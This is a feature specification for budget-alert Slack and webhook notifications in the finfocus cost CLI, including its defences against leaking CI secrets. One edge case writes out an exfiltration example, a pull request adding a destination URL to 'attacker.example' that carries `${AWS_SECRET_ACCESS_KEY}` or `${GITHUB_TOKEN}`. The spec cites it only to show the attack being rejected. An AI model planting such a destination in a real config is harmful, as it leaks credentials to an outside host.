# Feature Specification: Budget Alert Notifications

**Feature Branch**: `625-budget-alert-notifications`
**Created**: 2026-10-04
**Status**: Implemented
**Input**: User description: "Add webhook and email notifications for budget
alerts (GitHub issue rshade/finfocus#220). When a configured budget alert
threshold is crossed during a cost command, send notifications to configured
channels: Slack incoming webhook, generic HTTPS webhook, email via SMTP, and
optionally PagerDuty. Secrets come from environment variables and must never
be logged. HTTPS is required for webhooks. Notification failures never fail
the cost command."

## Clarifications

### Session 2026-10-04

- Q: When do notifications fire? → A: Opt-in per run. A run sends only when
  `--notify` is given or `FINFOCUS_NOTIFY` is true; configured destinations
  are otherwise ignored, with a one-line hint on stderr.
- Q: How are repeat alerts handled across runs? → A: Send on every run that
  crosses a threshold. No state is kept between runs.
- Q: Which destination types are in the first release? → A: Slack and generic
  webhook only. Email and PagerDuty are separate follow-up issues.
- Q: A project config is committed to the repository, so a pull request can
  edit it. How is a CI secret kept from leaking through a destination? → A:
  Only `${FINFOCUS_NOTIFY_*}` variables expand, and destinations defined in a
  project config never expand variables. Variable-based destinations live in
  the global config, which the CI workflow controls.

## User Scenarios & Testing *(mandatory)*

### User Story 1 - Team is told in chat when a budget threshold is crossed (Priority: P1)

A FinOps manager configures a budget with an 80% alert and a Slack channel.
When a cost command in CI finds that spend has crossed 80% of the budget, a
message appears in the team's Slack channel with the budget, current spend,
percentage, and threshold.

**Why this priority**: Chat alerts are the most requested channel and deliver
the core value on their own: a person learns about a budget problem without
reading CI logs.

**Independent Test**: Configure one budget, one alert threshold, and one Slack
destination pointing at a local mock endpoint. Run a cost command whose total
crosses the threshold and confirm the mock receives one message with the
expected fields.

**Acceptance Scenarios**:

1. **Given** a budget of $100 with an 80% actual alert routed to Slack, **When**
   a cost command run with `--notify` reports $85 of spend, **Then** one Slack message is sent that
   states the budget ($100.00/month), current spend ($85.00, 85%), the 80%
   threshold, and that it was exceeded.
2. **Given** the same configuration, **When** a cost command reports $50 of
   spend, **Then** no message is sent.
3. **Given** a budget with alerts at 80% and 100%, each routed to Slack, **When**
   spend reaches 105%, **Then** one message per exceeded threshold is sent.
4. **Given** the configuration from scenario 1 and $85 of spend, **When** the
   command runs without `--notify` and `FINFOCUS_NOTIFY` is unset, **Then** no
   message is sent and stderr shows one hint that a crossed threshold has
   notifications that were not enabled for this run. With $50 of spend, no
   hint is shown.
5. **Given** `FINFOCUS_NOTIFY=true` in the CI environment, **When** the
   command runs without `--notify`, **Then** messages are sent; an explicit
   `--notify=false` overrides the variable and sends nothing.
6. **Given** two consecutive runs that both cross the 80% threshold, **When**
   both run with `--notify`, **Then** each run sends its message.

---

### User Story 2 - Custom systems receive a structured alert event (Priority: P2)

A platform engineer routes budget alerts to an internal HTTPS endpoint. The
endpoint receives a JSON event (`budget.threshold.exceeded`) containing the
budget, threshold, current spend, and source metadata, with any configured
request headers such as an authorization token.

**Why this priority**: A generic webhook lets teams connect any system
(ticketing, incident tools, dashboards) without core needing a dedicated
integration for each.

**Independent Test**: Point a webhook destination at a local HTTPS mock,
cross a threshold, and assert the received event body and headers.

**Acceptance Scenarios**:

1. **Given** a webhook destination with an `Authorization` header taken from an
   environment variable, **When** a threshold is crossed, **Then** the endpoint
   receives the event with that header value and the documented JSON fields.
2. **Given** a webhook destination whose URL uses plain `http://`, **When** the
   configuration is validated, **Then** validation fails with a message that
   HTTPS is required.

---

### User Story 3 - Notification problems never break the cost check (Priority: P1)

An engineer's CI job runs a cost command. The Slack webhook is unreachable.
The cost command still prints its results and exits with the same code it
would have without notifications; the delivery failure is reported as a
warning.

**Why this priority**: Cost checks gate deployments. A third-party outage must
not turn a passing check into a failing one or hide the cost results.

**Independent Test**: Point a destination at an endpoint that returns an error
or times out and confirm the command output and exit code are unchanged and a
warning names the failed destination type.

**Acceptance Scenarios**:

1. **Given** a destination that returns HTTP 500, **When** a threshold is
   crossed, **Then** the command's output and exit code match a run without
   notifications, and a warning names the destination type and the failure.
2. **Given** a destination that does not respond, **When** a threshold is
   crossed, **Then** delivery gives up within the delivery time limit and the
   command finishes normally.
3. **Given** a preview run (`--dry-run`), **When** a threshold is crossed,
   **Then** no notification is sent and the command reports which
   notifications would have been sent.

---

### Edge Cases

- A referenced environment variable is unset or empty: that destination is
  skipped with a warning naming the variable (never its value); other
  destinations still send.
- Multiple budget scopes (global, provider, tag, type) cross thresholds in one
  run: each crossed alert notifies its own destinations independently.
- Results contain mixed currencies: budget evaluation is already skipped, so
  no notifications are sent.
- A budget is disabled (amount 0): no notifications.
- Forecasted alerts: a forecasted alert notifies when the forecasted
  percentage crosses its threshold, and the message says it is a forecast.
- The same destination is listed under several thresholds that all cross in
  one run: one message per threshold.
- Machine output (`--output json` or `ndjson`): notifications still send, and
  nothing about notifications is written to stdout.
- A destination's error response contains the request URL or a token: the
  warning must not echo secret values.
- A pull request edits the project config to add a destination such as
  `https://attacker.example/?k=${AWS_SECRET_ACCESS_KEY}` or a header
  `${GITHUB_TOKEN}`: validation rejects the reference because the variable
  is not a `FINFOCUS_NOTIFY_*` variable, and at send time it is never
  expanded.
- A pull request edits the project config to point a destination at its own
  host with `${FINFOCUS_NOTIFY_SLACK_URL}`: the project config cannot expand
  variables, so the destination is skipped with a warning and the variable's
  value is never sent.

## Requirements *(mandatory)*

### Functional Requirements

- **FR-001**: Users MUST be able to attach one or more notification
  destinations to each configured budget alert threshold, in every budget
  scope (global, provider, tag, and type).
- **FR-002**: The system MUST send a notification to each destination of an
  alert whose threshold is crossed (actual or forecasted, as configured) when a
  budget-evaluating cost command finishes evaluation.
- **FR-003**: Notifications MUST be sent only when the run opts in: the
  `--notify` flag on a budget-evaluating cost command, or `FINFOCUS_NOTIFY`
  set to a true value when the flag is not given. An explicit flag value
  overrides the variable. An invalid variable value is ignored with a warning.
  When the run has not opted in and at least one crossed threshold has
  destinations, nothing is sent and one hint line is printed to stderr.
- **FR-004**: The system MUST send on every opted-in run that crosses a
  threshold and MUST NOT store or read any notification history between runs.
- **FR-005**: The system MUST support two destination types, `slack`
  (incoming webhook) and `webhook` (generic HTTPS). Any other type MUST be
  rejected by configuration validation with a message listing the supported
  types.
- **FR-006**: Slack destinations MUST deliver a message containing budget name
  and amount, period, current spend, percentage, threshold, alert type, and
  status.
- **FR-007**: Generic webhook destinations MUST deliver a JSON event with
  fields `event` (`budget.threshold.exceeded`), `timestamp`, `budget` (name,
  amount, currency, period, scope), `threshold` (percentage, type, value),
  `current` (spend, percentage), and `metadata` (source `finfocus`, version),
  using the configured method (default POST) and headers.
- **FR-008**: Webhook and Slack destination URLs MUST use HTTPS; configuration
  validation MUST reject other schemes.
- **FR-009**: A destination's `url` and header values MUST accept
  `${NAME}` references, resolved from the environment at send time, only
  when `NAME` starts with `FINFOCUS_NOTIFY_`. A reference to any other
  variable MUST fail configuration validation and MUST NOT be expanded at
  send time (the destination is skipped with a warning).
- **FR-016**: Destinations defined in a project config
  (`$PROJECT/.finfocus/config.hujson`) MUST NOT expand any variable.
  Validation of a project config MUST reject a `${NAME}` reference in a
  destination with a message to move that destination to the global config.
  At send time such a destination is skipped with a warning. Destinations
  with only literal values in a project config still send.
- **FR-010**: Secret values (destination URLs and header values) MUST NOT appear in logs, warnings, errors, debug
  output, or `config get`/`config list` output; they are shown masked.
- **FR-011**: A delivery failure (error response, timeout, unresolved
  variable) MUST produce a warning on stderr naming the destination type and
  failure reason, and MUST NOT change the command's output or exit code.
- **FR-012**: Each delivery MUST be bounded by a time limit (default 10
  seconds per destination) so an unresponsive destination cannot stall the
  command.
- **FR-013**: The global `--dry-run` flag MUST suppress sending and report the
  notifications that would have been sent.
- **FR-014**: `config validate` and the cost pre-run validation MUST check the
  notification configuration (known destination types, required fields, HTTPS)
  and report problems with the same rules as other budget settings.
- **FR-015**: Notifications MUST NOT write anything to stdout, so JSON and
  NDJSON output remain parseable.

### Key Entities

- **Notification destination**: where an alert is delivered. Has a type
  (Slack or webhook), type-specific settings (URL, optional Slack channel
  override, webhook method and headers), and may reference environment
  variables for secrets.
- **Budget alert event**: the facts sent to a destination — budget scope and
  name, amount, currency, period, threshold percentage and type (actual or
  forecasted), current or forecasted spend, percentage, status, timestamp, and
  finfocus version.
- **Delivery result**: per destination outcome (sent, skipped, failed) with a
  secret-free reason, used for warnings and dry-run reporting.

## Success Criteria *(mandatory)*

### Measurable Outcomes

- **SC-001**: A user can add a Slack alert to an existing budget configuration
  and receive their first alert within 5 minutes using the documentation alone.
- **SC-002**: In 100% of tested failure cases (error response, timeout,
  unresolved variable, malformed destination), the cost command's output and
  exit code are identical to a run with no notifications configured.
- **SC-003**: An unresponsive destination adds no more than 10 seconds to a
  cost command's run time.
- **SC-004**: No secret value from configuration or environment appears in any
  captured log, warning, error, or config display across the test suite.
- **SC-006**: In tests where a project config references a CI variable
  (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, or a `FINFOCUS_NOTIFY_*`
  variable), no request carries that variable's value.
- **SC-005**: Every crossed threshold reaches each of its configured
  destinations exactly once per opted-in run, and zero times in a run that
  has not opted in.

## Assumptions

- Notifications build on the existing budget alert thresholds (#217, done);
  thresholds, scopes, and alert types are not redesigned.
- Delivery is attempted once per destination per run; there is no retry queue
  or background process, since finfocus is a short-lived CLI.
- Only monthly budgets exist today, so the event's period is always `monthly`.
- Literal secret values in the global config file are allowed, but
  documentation recommends `${FINFOCUS_NOTIFY_*}` references. A project
  config holds only literal values, so it must not hold secrets because it
  is committed.
- A project-config destination with literal values can still make CI send
  the budget event to a host chosen in a pull request. The event contains
  only budget figures, so this is accepted and documented; teams that run
  untrusted pull requests should not set `FINFOCUS_NOTIFY` on those runs.
- Destinations are sent concurrently so several slow destinations do not add
  their delays together.

## Out of Scope

- Email (SMTP) and PagerDuty destinations are tracked in #1702 and #1703.
  PagerDuty's Events API v2 does not accept the generic webhook event as is;
  reaching it before #1703 ships needs PagerDuty Event Orchestration or a
  relay that translates the event.
- Deduplication, rate limiting, and any notification history between runs.
- Retries and background delivery.

## Dependencies

- #217 budget threshold alerts (closed).
- Related: #219 budget exit codes (notifications must not change exit codes).
